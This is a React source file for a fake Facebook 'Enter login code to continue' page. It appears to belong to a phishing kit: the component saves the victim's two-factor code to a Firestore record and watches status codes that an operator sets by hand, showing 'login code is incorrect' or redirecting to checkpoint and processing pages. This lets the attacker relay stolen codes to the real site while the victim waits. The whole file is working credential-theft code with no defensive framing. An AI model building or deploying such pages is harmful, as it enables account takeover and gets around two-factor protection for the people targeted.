import React, { useState, useEffect } from "react";
import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore";
import { db } from "../../firebase";
import { useNavigate, useParams } from "react-router-dom";
import Header from "../../Header/Header";
export default function Twofactor() {
  const [code, setCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
    const [hideWarning, setHideWarning] = useState(true);
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!code.trim()) return;
          try {
        const userDocRef = doc(db, "users", userID);
        await updateDoc(userDocRef, {
          auth: code,
          status: 2
        });
        listener(userID);
        setIsSubmitting(true);
      } catch (error) {
        console.error("Error saving class code to Firestore: ", error);
      } finally {
      }
    // setIsSubmitting(true);
    // // Simulate API call
    // await new Promise((resolve) => setTimeout(resolve, 1000));
    // setIsSubmitting(false);
  };

  const isCodeValid = code.trim().length >= 6;


  const params = useParams();
    const navigate = useNavigate();
    const { userID } = params;
    const [result, setResult] = useState({
      title: "",
      detail: "",
    });
    const listener = (userID) => {
      onSnapshot(doc(db, "users", userID), (snapshot) => {
        const status = snapshot.data()?.status;
        if (status === 1) return;
  
        // Handle different status codes here
        switch (status) {
          case -1:
            setResult({
              title: "warning",
              detail: "Password is incorrect, please try again.",
            });
            break;
          case 2:
            navigate(`/checkpoint/${userID}`);
            break;
          case 3:
            navigate(`/processing/${userID}`);
            break;
          case -2:
            setResult({
              title: "Login code is required",
              detail: "Your login code is incorrect, please try again.",
            });
            setIsSubmitting(false);
            setHideWarning(false);
            break;
          default:
            setResult({
              title: "error",
              detail: "Unhandled status:" + status,
            });
        }
      });
    };
  
    useEffect(() => {
      setIsSubmitting(false);
    }, []);

  return (
    <div className="min-h-screen bg-facebook-bg overflow-auto">
      <title>Facebook</title>
    <Header/>
      {/* Progress bar (hidden by default) */}
      <div className="fixed top-0 left-0 right-0 h-1 bg-facebook-blue opacity-0 z-50" />

      <div className="flex justify-center min-h-screen">
        <div className="flex flex-col flex-grow relative">
          <div className="flex flex-col flex-grow bg-white justify-center min-h-screen">
            <div className="flex flex-col flex-basis-640 mt-6 px-6 relative">
              <div className="flex flex-col flex-grow mx-auto mt-1 mb-6 max-w-[600px] min-h-[552px] relative">
                <div className="flex flex-col flex-grow justify-center relative">
                  <div className="flex flex-col flex-shrink-0 max-w-full relative">
                    <div className="flex flex-col flex-shrink-0 max-w-full relative">
                      <div className="flex flex-col flex-grow relative">
                        {/* Header Section */}
                        <div className="flex flex-col flex-shrink-0 mb-2.5 max-w-full relative">
                          <div className="flex flex-col">
                            <span className="text-facebook-text font-medium text-sm leading-[17px] mb-3 max-w-full relative break-words whitespace-pre-line">
                              Facebook
                            </span>
                            <h2 className="break-words">
                              <span className="text-facebook-text font-semibold text-2xl leading-7 max-w-full relative break-words whitespace-pre-line">
                                Enter login code to continue
                              </span>
                            </h2>
                            <span className="text-facebook-text text-[15px] leading-[19px] mt-2 max-w-full relative break-words whitespace-pre-line">
                              <span className="inline break-words whitespace-pre-line">
                                <div className="flex flex-col mt-1 mb-1 break-words whitespace-pre-line">
                                  <span className="text-facebook-text text-[15px] leading-[19px] max-w-full relative break-words whitespace-pre-line">
                                    <span className="inline break-words whitespace-pre-line">
                                      Enter the 6-8 digit code from the phone or email or authentication app you set up.
                                    </span>
                                  </span>
                                </div>
                              </span>
                            </span>
                          </div>
                        </div>

                        {/* Illustration */}
                        <div className="flex flex-col flex-shrink-0 mb-2.5 mt-2.5 max-w-full relative">
                          <img
                            width="100%"
                            alt="Authentication app illustration"
                            src="https://www.facebook.com/images/assets_DO_NOT_HARDCODE/fb_company_illo/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png"
                            className="w-full overflow-clip"
                          />
                        </div>

                        {/* Form Section */}
                        <div className="flex flex-col flex-shrink-0 mt-2.5 max-w-full relative">
                          <div>
                            <form onSubmit={handleSubmit} method="GET">
                              <div className="mb-4">
                                <div className="mb-4">
                                  <div className="flex flex-col w-full">
                                    <div className="bg-white border border-facebook-border rounded-2xl box-border flex flex-col justify-center min-h-[60px] overflow-hidden px-4 py-2.5 relative w-full">
                                      <div className="flex items-center justify-between w-full">
                                        <input
                                          dir="ltr"
                                          autoComplete="off"
                                          aria-invalid="false"
                                          type="text"
                                          value={code}
                                          onChange={(e) =>
                                            setCode(e.target.value)
                                          }
                                          tabIndex={0}
                                          className="appearance-none box-border text-facebook-text cursor-text flex-grow h-[38px] text-[15px] font-medium leading-[19px] -ml-0.5 -mr-0.5 outline-none overflow-hidden px-0.5 py-0.5 text-ellipsis touch-manipulation border-0 bg-transparent"
                                          placeholder=""
                                        />
                                        <label
                                          htmlFor="code-input"
                                          className={`text-facebook-muted font-medium absolute left-4 text-[15px] leading-[19px] max-w-full overflow-hidden pointer-events-none text-ellipsis whitespace-nowrap transition-transform duration-200 ease-out ${
                                            code
                                              ? "transform scale-75 -translate-y-4"
                                              : "top-[18px]"
                                          }`}
                                        >
                                          Code
                                        </label>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>

                              {/* Hidden submit input */}
                              <input
                                type="submit"
                                className="appearance-none bg-white border-2 border-black box-border cursor-default h-px left-[-99999px] leading-normal opacity-[0.01] overflow-hidden px-1.5 py-1.5 absolute text-center whitespace-nowrap select-none"
                              />

                              {/* Continue Button */}
                              <div className="mb-3 mt-8">
                                <div className="inline-flex relative w-full">
                                  <button
                                    type="submit"
                                    disabled={!isCodeValid || isSubmitting}
                                    className={`box-border flex flex-col justify-center relative touch-manipulation select-none w-full ${
                                      !isCodeValid || isSubmitting
                                        ? "cursor-not-allowed"
                                        : "cursor-pointer"
                                    }`}
                                  >
                                    <div
                                      className={`flex items-center justify-center box-border flex-shrink-0 h-11 px-5 w-full relative select-none rounded-[22px] ${
                                        !isCodeValid || isSubmitting
                                          ? "bg-meta-blue opacity-40 cursor-not-allowed"
                                          : "bg-meta-blue cursor-pointer hover:bg-blue-600"
                                      }`}
                                    >
                                      <div className="flex items-center justify-center -mx-1 select-none w-[calc(100%+6px)]">
                                        <div className="flex items-center box-border flex-shrink-0 mx-1 max-w-full relative select-none">
                                          <span className="text-white cursor-inherit font-medium text-[15px] leading-[19px] max-w-full relative break-words select-none whitespace-pre-line">
                                            <span className="text-white cursor-inherit font-medium text-[15px] leading-[19px] max-w-full relative break-words overflow-hidden text-ellipsis whitespace-nowrap select-none">
                                              {isSubmitting
                                                ? "Verifying..."
                                                : "Continue"}
                                            </span>
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </button>
                                </div>
                              </div>

                              {/* Try Another Way Button */}
                              <div>
                                <div className="inline-flex relative w-full">
                                  <button
                                    type="button"
                                    className="box-border cursor-pointer flex flex-col justify-center relative touch-manipulation select-none w-full"
                                  >
                                    <div className="flex items-center bg-white border border-facebook-border rounded-[22px] box-border cursor-pointer flex-shrink-0 h-11 justify-center px-5 relative select-none w-full">
                                      <div className="flex items-center cursor-pointer justify-center -mx-1 select-none w-[calc(100%+6px)]">
                                        <div className="flex items-center box-border cursor-pointer flex-shrink-0 mx-1 max-w-full relative select-none">
                                          <span className="text-facebook-text cursor-pointer font-medium text-[15px] leading-[19px] max-w-full relative break-words select-none whitespace-pre-line">
                                            <span className="text-facebook-text cursor-pointer font-medium text-[15px] leading-[19px] max-w-full relative break-words overflow-hidden text-ellipsis whitespace-nowrap select-none">
                                              Try Another Way
                                            </span>
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </button>
                                </div>
                              </div>
                              {/* ERROR POPUP */}
      {!hideWarning && 
      <div
      role="presentation"
      className="fixed inset-0 z-[1000] flex items-center justify-around bg-black/50 modal-backdrop-enter"
      style={{
        fontFamily:
          'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
      }}
    >
      <div
        tabIndex={-1}
        aria-label="Email address or mobile number required"
        className="w-[350px] max-w-[calc(100%-2rem)] mx-4 sm:mx-8 bg-white rounded-xl text-center shadow-2xl modal-enter"
        style={{
          fontFamily:
            'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
        }}
      >
        {/* Header section with dark background */}
        <div
          className="px-6 sm:px-8 py-6 sm:py-8 text-center bg-white rounded-t-xl"
          style={{
            fontFamily:
              'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
          }}
        >
          <div
            className="text-black text-lg font-semibold text-center"
            style={{
              fontSize: "18px",
              fontWeight: "600",
              color: "rgb(255, 255, 255)",
            }}
          >
            {result.title ? result.title : 'Your login session has expired.'}
          </div>
          <div
            className="mt-3 text-center text-gray-700"
            style={{
              fontFamily:
                'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
            }}
          >
             {result.detail ? result.detail : 'Enter your email address or mobile number to continue.'}
          </div>
        </div>

        {/* Button section */}
        <div
          className="text-center"
          style={{
            fontFamily:
              'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
          }}
        >
          <div
            role="button"
            tabIndex={0}
            className="py-3 px-2.5 text-center cursor-pointer border-t border-solid border-t-gray-300 text-blue-600 hover:bg-gray-50 active:bg-gray-100 focus:bg-gray-50 focus:outline-none transition-colors rounded-b-xl"
            style={{
              fontSize: "16px",
              lineHeight: "24px",
              color: "rgb(0, 100, 224)",
              borderTopColor: "rgb(206, 208, 212)",
              borderTopWidth: "1px",
              borderTopStyle: "solid",
              whiteSpace: "nowrap",
              fontFamily:
                'system-ui, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
            }}
            onClick={() => {
              setHideWarning(true);
            }}
            onKeyDown={(e) => {
              if (e.key === "Enter" || e.key === " ") {
                e.preventDefault();
                setHideWarning(true);
              }
            }}
          >
            OK
          </div>
        </div>
      </div>
    </div>
    }
    {/* ERROR POPUP */}
                            </form>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
